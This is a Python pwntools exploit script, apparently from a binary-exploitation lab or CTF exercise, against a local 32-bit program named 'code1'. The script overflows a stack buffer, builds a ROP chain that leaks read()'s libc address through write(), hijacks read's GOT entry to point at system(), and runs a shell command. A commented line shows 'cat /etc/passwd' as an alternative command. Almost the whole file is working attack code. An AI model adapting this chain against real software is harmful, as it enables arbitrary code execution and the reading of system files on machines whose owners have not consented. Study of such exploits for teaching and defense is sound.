#!/usr/bin/python

import sys
import struct
from pwn import *



p = process('./code1')

# (buffer_address - ret_stack_addr) * 'a'
a_crap = 'a' * 112

payload = a_crap

# Execute read() function and get the command to be executed. 

read_plt_addr = 0x08048330
pppr_addr = 0x08048549
stdin_fd = 0
dynamic_addr = 0x08049f14
command_size = 100          # Size of .dynamic = 232 bytes(upper limit)

payload += struct.pack('<I', read_plt_addr)     
payload += struct.pack('<I', pppr_addr)         # Return Address of read()
payload += struct.pack('<I', stdin_fd)          # Take user input
payload += struct.pack('<I', dynamic_addr)      # Write into .dynamic section
payload += struct.pack('<I', command_size)      # Command size

# Execute write() function and leak read's address(Using updated GOT entry)

write_plt_addr = 0x08048360
stdout_fd = 1
read_got = 0x0804a00c
leak_size = 4           # Address is 4 bytes and thats all we want.


payload += struct.pack('<I', write_plt_addr)
payload += struct.pack('<I', pppr_addr)
payload += struct.pack('<I', stdout_fd)         # Write address into stdout
payload += struct.pack('<I', read_got)          # Leak read's address
payload += struct.pack('<I', leak_size)         # Leak 4 bytes - an address

# Once you get read's address, execute it to overwrite read's GOT with system()'s address


payload += struct.pack('<I', read_plt_addr)     
payload += struct.pack('<I', pppr_addr)         # Return Address of read()
payload += struct.pack('<I', stdin_fd)          # Take user input
payload += struct.pack('<I', read_got)          # Write system's address into read's GOT
payload += struct.pack('<I', 4)                 # Size of address = 4 bytes




# Call read_plt - essentially calling system() now

payload += struct.pack('<I', read_plt_addr)     # Calling system
payload += struct.pack('<I', 0xbbbb)            # Some crap - we can put exit's address for smooth exit
payload += struct.pack('<I', dynamic_addr)      # This is where the command is located

payload += "\x00"                                 # Stop reading!

p.recv(1000)

# Send the payload
p.send(payload)

# Send command
command = 'id' + '\x00'
p.send(command)

# Wait for it send read()'s address
read_addr = p.recv(1000)

print read_addr

# payload += "/bin/cat /etc/passwd" + "\0"        # Execute cat /etc/passwd

read_libc_addr = struct.unpack('<I', read_addr)[0]

print hex(read_libc_addr)

# Compute system's address

read_offset = 875264
system_offset = 241056


system_libc_addr = read_libc_addr - read_offset + system_offset     # Find system()'s address


print hex(system_libc_addr)

system_libc = struct.pack('<I', system_libc_addr)  

p.sendline(system_libc)


p.interactive()


# Write the complete payload into a file "exploit.txt"

f = open('exploit.txt', 'wb')
f.write(payload)
f.close()
